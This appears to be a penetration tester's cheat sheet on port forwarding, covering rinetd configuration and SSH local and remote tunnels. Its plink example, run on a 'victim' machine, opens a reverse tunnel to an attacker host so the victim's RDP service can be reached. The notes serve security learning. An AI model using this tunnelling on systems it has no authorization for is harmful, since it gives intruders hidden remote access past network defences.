### Port Forwarding

```
# install rinetd
nano /etc/rinetd.conf
# bindadress bindport connectaddress connectport 
wxyz         53       a.b.c.d        80

service rinetd restart
```

## SSH Local and Remote Port Forwarding
```
# local port forwarding, connect from local port to remote port over ssh
ssh <gateway> -L <local port to listen>:<remote host>:<remote port>

# remote port forwarding, connect remote port to local port over ssh
# copy over plink.exe, make sure sshd is running on attacker
plink.exe -l root -pw supersecretpassword 208.x.x.x -R 3390:127.0.0.1:3389      #victim
# this will open up 3390 on local attacking box, and router traffic from this port to 3389 on the remote ip.
rdesktop -u user -p pass 127.0.0.1:3390                                         #attacker


```